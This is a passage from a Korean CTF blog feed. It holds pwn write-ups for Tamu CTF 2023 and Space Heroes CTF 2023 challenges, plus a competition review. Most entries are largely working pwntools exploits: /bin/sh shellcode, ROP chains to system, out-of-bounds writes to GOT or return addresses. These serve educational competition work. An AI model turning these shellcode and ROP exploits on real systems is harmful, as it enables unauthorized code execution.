python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;sea-shells&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./sea-shells&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./sea-shells&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x7fff</span>):</span><br><span class="line">    i = <span class="number">0x4500</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="comment"># info(hex(i))</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">    result = p.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;Woohoo&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        info(<span class="built_in">hex</span>(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;work: &#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span>.ljust(<span class="number">32</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh()).ljust(32, b&#x27;\0&#x27;)</span></span><br><span class="line"></span><br><span class="line">values = struct.unpack(<span class="string">&#x27;4Q&#x27;</span>, shellcode)</span><br><span class="line"><span class="built_in">print</span>(values)       </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">3</span>])) <span class="comment"># 1</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">2</span>])) <span class="comment"># 2</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">1</span>])) <span class="comment"># 3</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(values[<span class="number">0</span>])) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x9</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(leak + <span class="number">0x40</span>)</span><br><span class="line">payload += asm(<span class="string">&#x27;sub rsp, 0x100\n&#x27;</span> + shellcraft.sh())</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;cr34t1v3_5h3llc0d3_ftw&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Bank (pwn, oob write)</title>
      <link href="/230503-tamu2023-6.Bank-pwn/"/>
      <url>/230503-tamu2023-6.Bank-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I came up with this banking system that lets you deposit as much as you want. I’m not sure why, but my friend said it was a terrible idea…<br>Author: nhwn</p></blockquote><ul><li>[68 solves &#x2F; 456 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>바이너리와 소스코드를 제공해준다. libc도 제공해줬다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> accounts[<span class="number">100</span>];</span><br><span class="line"><span class="type">char</span> exit_msg[] = <span class="string">&quot;Have a nice day!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">deposit</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> amount = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the number (0-100) of the account you want to deposit in: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the amount you want to deposit: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;amount);</span><br><span class="line">    accounts[index] += amount;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    deposit();</span><br><span class="line">    deposit();</span><br><span class="line">    <span class="built_in">puts</span>(exit_msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>accounts[index] += amount;</code> 에서 <code>index</code> 검사를 하지 않기 때문에 <code>oob write</code>가 발생한다. 간단한 소스코드이다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>accounts</code>는 bss 영역에 있기 때문에 <code>puts@got</code>를 잘 조절해서 <code>onegadget</code> 오프셋으로 만들자!</p><p><code>puts@got</code>가 위치한 곳엔 어떻게 접근하느냐? <code>oob</code>가 발생하기 때문에 <code>index</code>를 이용해서 충분히 접근 가능하다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;bank&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./bankp&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_off = [<span class="number">0x4497f</span>, <span class="number">0x449d3</span>, <span class="number">0xe5306</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;-16&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">off =  one_gadget_off[<span class="number">0</span>] - <span class="number">0x71a40</span> </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(off))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;a_v3ry_h3fty_d3p0s1t&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 review</title>
      <link href="/230430-tamu2023-0review/"/>
      <url>/230430-tamu2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li><li><a href="https://github.com/tamuctf/tamuctf-2023">https://github.com/tamuctf/tamuctf-2023</a></li></ul><p>이번 주말에 오랜만에 전력(?)으로 posix와 함께 CTF에 참여했다. 원래 각자 포너블만 풀어서 그냥 따로 참여했었는데 이번에는 처음으로 같은 팀으로 참여했다. 나는 평소에 포너블만 건드려서 풀이 속도가 느리더라도 포너블 위주로 풀고 싶었었는데 posix가 나에게 포너블을 양보해줘서 그렇게 할 수 있었다. 팀 명은 아무거나 하라고 해서 내 닉넴으로 하였다. (시작하기 전에 물어봤는데 해도 된다고 했다.ㅎ)</p><img src="/images/230430-tamu2023-0review/1.png" width=700/><br><p>결과적으로 우리는 10등을 할 수 있었다! 원래는 14등쯤이었는데 막판에 크립토 문제를 해결해서 10등에 안착할 수 있었다.</p><img src="/images/230430-tamu2023-0review/2.png" width=700/><br><p>posix가 사실 거의 다 풀었다. 웹이랑 리버싱을 캐리해줬다. 내가 인증한 문제는 목록은 아래와 같다.</p><img src="/images/230430-tamu2023-0review/3.png" width=700/><br><img src="/images/230430-tamu2023-0review/4.png" width=700/><br><p>빨간색 네모는 내가 풀고 인증했고, 파란색 네모는 열심히 분석했지만 풀지 못한 경우, 혹은 같이 분석하다가 posix가 먼저 풀어서 인증한 경우, 혹은 posix가 거의 다 분석했지만 내가 flag를 찾아서 인증한 경우이다.<br>(포너블 첫번째 문제 거의 10분컷해서 내가 퍼블먹었다. ㅎ 포너블 첫번째 문제 풀고 딴거하러 갔다.)</p><p>이번 기회로 크립토에 대한 흥미가 아주 살짝 생겼다. 이 씨텝을 통해 md5 collision과 prng, lcg 알고리즘에 대해 새롭게 알게되었다. 덕분에 블로그 최초 크립토 롸업을 작성해보려고 한다. 크립토 문제 풀면서 대회 끝나기 1시간 전에 ChatGPT한테 이것저것 물어보고 힌트 얻어서 <code>prng</code> 문제를 바로 풀 수 있었다. ㅋㅋ 첫번째 rsa 문제는 끝나고 롸업봤는데도 아직도 모르겠다. 풀고 싶어서 열심히 노력했는데 결국에 풀지 못해서 아쉽다.</p><p>포너블은 역시 분석보다 익스가 훨씬 어렵다. 코드 읽고 추측 못해도 디버깅하면서 취약점은 생각보다 금방 찾을 수 있는데 익스가 너무 어려웠다. 특히 <code>Pwnme</code>… 되게 간단한데 어떻게 풀지 몰라서 posix한테 도움 요청해서 같이 보다가 posix가 천재같은 발상(나는 못했던 발상)으로 풀어버렸다 ㄷㄷ. <code>Shellcode</code> 문제는 whitelist가 너무 빡세서 and와 or 연산정도밖에 사용못한다. 아직 내 역량으로는 풀 수 없을 것 같아서 posix한테 풀어달라고 했다. ㅎ <code>Macchiato</code> 문제는 자바로 작성되어 있다. 자바로 작성된 프로그램은 메모리 관리를 가비지 컬렉터가 잘 해주기 때문에 일반적으로 메모리 커럽션 취약점이 발생할 수 없다. 그래서 일부러 취약한 키워드를 작성해줘야 한다. 새벽에 분석 조금 하다가 잠와서 그만뒀다. </p><p>포렌식 첫번째 문제는 메모리 포렌식 문제이다. 디스크 이미지를 제공해주는데 mount까지 하고 posix와 같이 분석했다. 문제에서 제공해준 pcap 파일에서 4444 포트에 접속해서 데이터를 주고 받은 것을 바탕으로 4444 포트를 여는 바이너리를 찾으려고 했다. vi history인가 그거 보고 수상한 파이썬 코드를 찾았는데 AES encode를 이용하여 통신을 할 수 있는 코드였다. 여기서부터 뚝딱뚝딱 posix가 pcap 파일에서 데이터 전송한거랑 전송받은 것을 해석해서 flag를 구할 수 있었다. 두번째 <code>Discordance</code> 문제는 열심히 노력했는데 결국 풀지 못하였다. 롸업봤는데 내 기준으로 게싱 요소가 있어서 하루종일 봤어도 못 풀었을 것 같다. </p><p>미스크는 나름 재밌었다. 마지막 문제는 마인크래프트에서 명령어를 실행시키는 문제인데 너무 신박했다. 내가 관여한 것은 하나도 없지만 그냥 재밌었다. </p><p>대회 시작하기 전에 씨텝 운영진의 실수로 대회 시간이 조금 이상했지만, (세계 시간을 제대로 숙지하지 못한 것으로 보인다.) 문제는 전부 다 생각보다 재밌었다. 대회 기간도 48시간이라 아무것도 모르는 크립토를 공부하면서 풀 수 있어서 매우 의미있던 시간이었다.</p><p>롸업은 크립토 두 문제와 포너블 8 문제를 적으려고 한다. 다 적으면 여기 아래 링크를 추가할 예정이다.</p><ul><li>Pwn<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/">http://jiravvit.github.io/230503-tamu2023-1.Inspector_Gadget-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/">http://jiravvit.github.io/230503-tamu2023-2.Unlucky-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/">http://jiravvit.github.io/230503-tamu2023-3.Pointers-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/">http://jiravvit.github.io/230503-tamu2023-4.Randomness-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/">http://jiravvit.github.io/230503-tamu2023-5.Sea_Shells-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/">http://jiravvit.github.io/230503-tamu2023-6.Bank-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/">http://jiravvit.github.io/230503-tamu2023-7.Encryptinator-pwn/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/">http://jiravvit.github.io/230503-tamu2023-8.Pwnme-pwn/</a></li></ul></li><li>Crypto<ul><li><a href="http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/">http://jiravvit.github.io/230503-tamu2023-9.MD5-crypto/</a></li><li><a href="http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/">http://jiravvit.github.io/230503-tamu2023-10.PRNG-crypto/</a></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - engine failure (simple rop)</title>
      <link href="/230428-superheroesctf2023-engine-failure/"/>
      <url>/230428-superheroesctf2023-engine-failure/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 245 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2번 옵션을 통해 <code>puts</code> 립시 주소를 출력해주고, 1번 옵션을 통해 <code>gets</code> 함수를 실행할 수 있다. 늘 하던대로 <code>ROP</code>를 하면 된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./engine_failure.bin&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>,<span class="number">443</span>,ssl=<span class="literal">True</span>,sni=<span class="string">&quot;spaceheroes-engine-failure.chals.io&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./engine_failure.bin&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = e.libc</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span> + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(libc.address + <span class="number">0x2a3e5</span>)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(libc.address + <span class="number">0x29cd6</span>)</span><br><span class="line">payload += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;3ng1n3s_0ut_w3_4r3_d00med!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System (oob, shellcode)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1856">https://ctftime.org/event/1856</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; 249 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> selectedOption; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">int</span> pageSize; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> *addr; <span class="comment">// [rsp+8h] [rbp-68h] BYREF</span></span><br><span class="line">  __int64 <span class="built_in">array</span>[<span class="number">10</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  print_art();</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  addr = <span class="built_in">malloc</span>(<span class="number">0x40</span>uLL);</span><br><span class="line">  pageSize = getpagesize();</span><br><span class="line">  posix_memalign(&amp;addr, pageSize, pageSize);    <span class="comment">// pageSize = 4096 0x1000</span></span><br><span class="line">  mprotect(addr, pageSize, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your name and rank &gt;&gt;&gt; &quot;</span>);</span><br><span class="line">  fgets(addr, <span class="number">64</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome back, %s\n&quot;</span>, addr);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    print_menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;selectedOption);</span><br><span class="line">    getchar();</span><br><span class="line">    performAction(selectedOption, <span class="built_in">array</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc</code>을 통해 반환된 <code>heap</code>은 <code>mprotect</code> 함수로 인해 실행 권한이 주어진 영역이 되었다. 여기에 쉘코드를 넣고 흐름을 여기로 전환시키면 될 것 같다. </p><p><code>performAction</code> 함수에서 대놓고 <code>oob read</code>와 <code>oob write</code>를 찾을 수 있다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;spaceheroes-cardassian-targeting-system.chals.io&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./cardassian-targeting-system&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./cardassian-targeting-system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_read</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;coordinates: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oob_write</span>(<span class="params">idx, data</span>):</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    pause()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asdf</span>(<span class="params">shellcode</span>):</span><br><span class="line">    p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">asdf(shellcode)</span><br><span class="line"></span><br><span class="line">heap = oob_read(-<span class="number">1</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -3 : ret</span></span><br><span class="line">oob_write(-<span class="number">3</span>, heap)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shctf&#123;cardass1an5_ar3_m3t1culou5_r3c0rd_k33p3rs&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Space Heroes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oob </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Space Heroes CTF 2023 - Cardassian Targeting System Mk.2 (oob, one_gadget)</title>
      <link href="/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/"/>
      <url>/230428-superheroesctf2023-Cardassian-Targeting-System-Mk.2/</url>
      
